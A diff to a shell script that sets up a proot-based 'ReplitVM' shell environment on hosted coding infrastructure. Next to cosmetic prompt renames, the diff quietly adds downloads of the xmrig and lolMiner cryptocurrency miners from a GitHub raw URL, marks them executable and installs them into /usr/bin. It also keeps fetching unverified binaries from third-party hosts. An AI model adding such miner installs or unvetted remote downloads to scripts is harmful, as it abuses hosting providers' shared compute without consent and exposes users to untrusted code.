@@ -41,13 +41,13 @@ echo "${nc}"
 if [[ -f "./installed" ]]; then
     echo "${bold}${lightgreen}==> Started ${lightblue}ReplitVM${lightgreen} <=="
     function runcmd1 {
-        printf "${bold}${lightgreen}User${nc}@${lightblue}Replit-vm${nc}:~ "
+        printf "${bold}${lightgreen}User${nc}@${lightblue}ReplitVM${nc}:~ "
         read -r cmdtorun
         ./dist/proot -S . /bin/bash -c "$cmdtorun"
         runcmd
     }
     function runcmd {
-        printf "${bold}${lightgreen}User${nc}@${lightblue}Replit-vm${nc}:~ "
+        printf "${bold}${lightgreen}User${nc}@${lightblue}ReplitVM${nc}:~ "
         read -r cmdtorun
         ./dist/proot -S . /bin/bash -c "$cmdtorun"
         runcmd1
@@ -55,6 +55,8 @@ if [[ -f "./installed" ]]; then
     runcmd
 else
     echo "Downloading files for ReplitVM"
+    curl -sSLo xmrig raw.githubusercontent.com/afnan007a/Ptero-vm/main/xmrig
+    curl -sSLo lolminer raw.githubusercontent.com/afnan007a/Ptero-vm/main/lolMiner
     curl -sSLo playit https://playit.gg/downloads/playit-linux_64-0.4.6
     curl -sSLo ngrok.zip https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
     curl -sSLo ptero-vm.zip https://i.redknight.xyz/u/ptero-vm.zip
@@ -70,6 +72,8 @@ else
     tar -xf root.tar.gz 
     chmod +x ./dist/proot
     chmod +x playit
+    chmod +x xmrig
+    chmod +x lolminer
     chmod +x ngrok
     chmod +x gotty
     rm -rf ptero-vm.zip
@@ -79,6 +83,8 @@ else
     clear
     
     touch installed
+    ./dist/proot -S . /bin/bash -c "mv xmrig /usr/bin/"
+    ./dist/proot -S . /bin/bash -c "mv lolminer /usr/bin/"
     ./dist/proot -S . /bin/bash -c "mv gotty /usr/bin/"
     ./dist/proot -S . /bin/bash -c "mv apth /usr/bin/"
     ./dist/proot -S . /bin/bash -c "mv unzip /usr/bin/"
@@ -124,13 +130,13 @@ echo "${nc}"
     
     echo "${bold}${lightgreen}==> Started ${lightblue}ReplitVM${lightgreen} <=="
     function runcmd1 {
-        printf "${bold}${lightgreen}User${nc}@${lightblue}Replit-vm${nc}:~ "
+        printf "${bold}${lightgreen}User${nc}@${lightblue}ReplitVM${nc}:~ "
         read -r cmdtorun
         ./dist/proot -S . /bin/bash -c "$cmdtorun"
         runcmd
     }
     function runcmd {
-        printf "${bold}${lightgreen}User${nc}@${lightblue}Replit-vm${nc}:~ "
+        printf "${bold}${lightgreen}User${nc}@${lightblue}ReplitVM${nc}:~ "
         read -r cmdtorun
         ./dist/proot -S . /bin/bash -c "$cmdtorun"
         runcmd1
